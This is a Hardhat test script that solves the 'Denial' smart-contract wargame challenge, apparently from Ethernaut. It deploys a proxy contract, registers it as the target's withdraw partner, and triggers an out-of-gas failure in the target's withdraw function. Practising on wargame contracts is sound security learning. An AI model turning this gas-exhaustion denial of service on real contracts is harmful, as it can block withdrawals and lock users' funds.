import { ethers } from "hardhat";
import { expect } from "chai";

describe("denial", function() {
    it("should solve denial challenge", async function() {
        this.timeout(0);

        // setup & check wallet account 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0);

        // define target abi's necessary parts
        const targetABI = [
            "function setWithdrawPartner(address _partner) public",
            "function withdraw() public",
        ]
        const targetAddr = "0x409bcb5875fa4A077981a4409726613456428D7a";

        let contract = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        let targetCont = contract.connect(eoa);

        const proxyFactory = await ethers.getContractFactory("DenialProxy");
        const proxyCont = await proxyFactory.deploy();
        await eoa.provider!.waitForTransaction(proxyCont.deployTransaction.hash);
        console.log("DenialProxy deployed at: " + proxyCont.address);

        let tx = await targetCont.setWithdrawPartner(proxyCont.address);
        await tx.wait();
        console.log(tx);

        // this should fail because of "out of gas"
        tx = await targetCont.withdraw();
        await tx.wait();
        console.log(tx);
    });
});